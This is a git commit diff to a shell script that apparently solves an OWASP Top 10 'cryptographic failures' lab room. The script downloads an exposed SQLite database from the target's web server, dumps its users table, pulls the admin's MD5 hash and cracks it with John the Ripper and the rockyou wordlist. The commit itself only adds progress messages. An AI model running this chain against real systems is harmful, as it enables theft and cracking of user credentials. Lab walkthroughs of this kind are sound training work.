5e73ccbe107318c2e11d27fdb89511fe5c9b5034
Nadege Lemperiere <nadege.lemperiere@gmail.com>
2024-11-30 20:17:07 -0500

    Testing script

--- rooms/owasptop102021/cryptographic-failures.sh
+++ rooms/owasptop102021/cryptographic-failures.sh
@@ -12,23 +12,28 @@ attack_ip="10.10.30.237"
 mkdir /work/ 2>/dev/null
 
 # Collect database content from assets directory (look at the page source code)
+echo "1 - RETRIEVING WEBAPP.DB"
 wget -q http://$target_ip:81/assets/webapp.db
 mv webapp.db /work/webapp.db
 
 # Use sqlite3 to gather content
 # Perform the query
+echo "2 - ANALYZING DATABASE USING sqlite3"
 sqlite3 /work/webapp.db ".tables" > /work/tables
 sqlite3 /work/webapp.db "PRAGMA table_info(users)" > /work/headers
 sqlite3 /work/webapp.db "SELECT * FROM users;" > /work/users
 
 # Gather admin password
+echo "3 - GATHERING HASHED ADMIN PASSWORD"
 HASH=$(grep admin /work/users | awk -F'|' '{print $3}')
 echo $HASH > /work/hash.txt
+echo "Hash : $HASH"
 
 # Crack it with John
+echo "4 - GATHERING HASHED ADMIN PASSWORD"
 rm /opt/john/john.pot 2>/dev/null
 /opt/john/john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /work/hash.txt >/dev/null 2>/dev/null
 /opt/john/john --show /work/hash.txt >/dev/null 2>/dev/null
 PASSWORD=$(cat /opt/john/john.pot | awk -F':' '{print $2}')
-echo $PASSWORD
+echo "Password cracked : $PASSWORD"
 
